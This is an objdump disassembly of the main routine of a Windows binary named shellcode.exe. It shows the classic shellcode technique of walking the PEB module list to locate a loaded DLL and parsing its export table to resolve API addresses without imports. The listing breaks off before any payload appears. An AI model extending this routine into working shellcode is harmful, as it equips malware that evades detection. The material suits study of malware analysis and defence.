
.\shellcode.exe:     file format pei-i386


Disassembly of section .text:

004014f0 <_main>:
  4014f0:	55                   	push   %ebp
  4014f1:	89 e5                	mov    %esp,%ebp
  4014f3:	83 e4 f0             	and    $0xfffffff0,%esp
  4014f6:	83 c4 80             	add    $0xffffff80,%esp
  4014f9:	e8 c2 02 00 00       	call   4017c0 <___main>
  4014fe:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  401504:	89 44 24 78          	mov    %eax,0x78(%esp)
  401508:	8b 44 24 78          	mov    0x78(%esp),%eax
  40150c:	83 c0 0c             	add    $0xc,%eax
  40150f:	8b 00                	mov    (%eax),%eax
  401511:	89 44 24 74          	mov    %eax,0x74(%esp)
  401515:	8b 44 24 74          	mov    0x74(%esp),%eax
  401519:	83 c0 14             	add    $0x14,%eax
  40151c:	8b 00                	mov    (%eax),%eax
  40151e:	89 44 24 70          	mov    %eax,0x70(%esp)
  401522:	8b 44 24 70          	mov    0x70(%esp),%eax
  401526:	8b 00                	mov    (%eax),%eax
  401528:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  40152c:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  401530:	8b 00                	mov    (%eax),%eax
  401532:	89 44 24 68          	mov    %eax,0x68(%esp)
  401536:	8b 44 24 68          	mov    0x68(%esp),%eax
  40153a:	83 c0 10             	add    $0x10,%eax
  40153d:	8b 00                	mov    (%eax),%eax
  40153f:	89 44 24 64          	mov    %eax,0x64(%esp)
  401543:	8b 44 24 64          	mov    0x64(%esp),%eax
  401547:	8b 40 3c             	mov    0x3c(%eax),%eax
  40154a:	89 44 24 60          	mov    %eax,0x60(%esp)
  40154e:	8b 54 24 60          	mov    0x60(%esp),%edx
  401552:	8b 44 24 64          	mov    0x64(%esp),%eax
  401556:	01 d0                	add    %edx,%eax
  401558:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  40155c:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  401560:	83 c0 18             	add    $0x18,%eax
  401563:	89 44 24 58          	mov    %eax,0x58(%esp)
  401567:	8b 44 24 58          	mov    0x58(%esp),%eax
  40156b:	83 c0 60             	add    $0x60,%eax
  40156e:	89 44 24 54          	mov    %eax,0x54(%esp)
  401572:	8b 44 24 54          	mov    0x54(%esp),%eax
  401576:	8b 00                	mov    (%eax),%eax
  401578:	89 44 24 50          	mov    %eax,0x50(%esp)
  40157c:	8b 54 24 50          	mov    0x50(%esp),%edx
  401580:	8b 44 24 64          	mov    0x64(%esp),%eax
  401584:	01 d0                	add    %edx,%eax
  401586:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  40158a:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  40158e:	83 c0 1c             	add    $0x1c,%eax
  401591:	8b 00                	mov    (%eax),%eax
  401593:	89 c2                	mov    %eax,%edx
  401595:	8b 44 24 64          	mov    0x64(%esp),%eax
  401599:	01 d0                	add    %edx,%eax
  40159b:	89 44 24 48          	mov    %eax,0x48(%esp)
  40159f:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4015a3:	83 c0 20             	add    $0x20,%eax
  4015a6:	8b 00                	mov    (%eax),%eax
  4015a8:	89 c2                	mov    %eax,%edx
  4015aa:	8b 44 24 64          	mov    0x64(%esp),%eax
  4015ae:	01 d0                	add    %edx,%eax
